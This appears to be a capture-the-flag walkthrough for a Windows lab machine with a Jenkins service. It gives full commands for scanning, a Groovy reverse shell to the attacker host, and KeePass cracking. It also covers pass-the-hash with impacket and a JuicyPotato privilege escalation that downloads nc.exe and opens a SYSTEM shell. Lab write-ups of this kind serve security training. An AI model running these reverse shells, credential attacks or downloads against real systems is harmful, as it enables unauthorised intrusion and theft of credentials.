- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.10.63 -oG scan
	/opt/extractports scan
	nmap -p80,135,445,50000 -Pn -sCV 10.10.10.63 -oN ports
	```

- Searching through the website I can't find anything, it's too simple. 

	![image](https://github.com/user-attachments/assets/e957712f-9e93-4e4f-8ad2-12a9e2e4fad3)

- I decide to list directories and find one, “askjeeves”. When I enter this one I find a jenkis service that I don't need to provide credentials to enter.

	```python
	gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -f -t 200
	```

- Inside this one I move to the scripts section to run a [revershell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy).

	```python
	String host="10.10.14.8";
	int port=4444;
	String cmd="cmd.exe";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
	```

- Once inside the system, I can read the first flag.

- Looking through the user's files I find inside “Documents” a .kdbx file. I pass it to my system, with keepass2john I extract its hash and I manage to break it.
	
  ![image](https://github.com/user-attachments/assets/d63c3bdf-3ff5-45c9-877e-00fec9e7423e)
	
	```python
	keepass2john CEH.kdbx > hash
	john hash --wordlist=/usr/share/wordlists/rockyou.txt 
	```

- Inside this file I find several users and passwords. One of the passwords has the hash format nt. I validate which user it belongs to and I see that it is that of the administrator user. 

	![image](https://github.com/user-attachments/assets/b5ccdb56-785a-402a-81dd-3bbe276c27f0)
	
	```python
	netexec smb 10.10.10.63 -u usernames -H aad3XXXXXXXXXXXXXXXXX04ee:e0fb1fXXXXXXXXXXXXXXXXXXXXXxfe00
	```
	
	![image](https://github.com/user-attachments/assets/de664dbf-8a7d-4389-b1f6-dea783640c0a)

- I connect as this user making a PtH

```python
impacket-smbclient administrator@10.10.10.63 -hashes e0fb1fb85756c24235ff238cbe81fe00:e0fb1fb85756c24235ff238cbe81fe00
```

- After searching for a long time I find that the second flag is hidden. I can see it thanks to the following command.
	
	```python
	dir /R
	```
	
	![image](https://github.com/user-attachments/assets/faa2ae2e-a1ac-4167-96c1-0d9db4485474)

- There are several ways to read the hidden file. A couple of them are as follows.
	
	```python
	more < hm.txt:root.txt
	# or 
	powershell Get-Content -Path "hm.txt" -Stream "root.txt"
	```

- This is one way to resolve the machine but being the user kohsuke there is another way to escalate privileges.

	![image](https://github.com/user-attachments/assets/89f288dd-5ba7-4aae-ae05-7bbbc529b168)

- If we look at the privileges that this user has, we can see that he has the “SeImpersonatePrivilege” enabled. Thanks to this privilege I can get an interactive console as nt autority. To achieve this we can make use of [JuicyPotatoypo](https://github.com/ohpe/juicy-potato).
	
	```python
	powershell -Command "Invoke-WebRequest http://10.10.14.8:8000/JuicyPotato.exe -OutFile C:\Temp\JuicyPotato.exe"
	powershell -Command "Invoke-WebRequest http://10.10.14.8:8000/nc.exe -OutFile C:\Temp\nc.exe"
	
	
	c:\Temp\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Temp\nc.exe 10.10.14.8 8445 -e cmd.exe" -t *
	```

- With this way we get to the same point as with the other way but it is interesting to know other techniques to escalate our privileges.
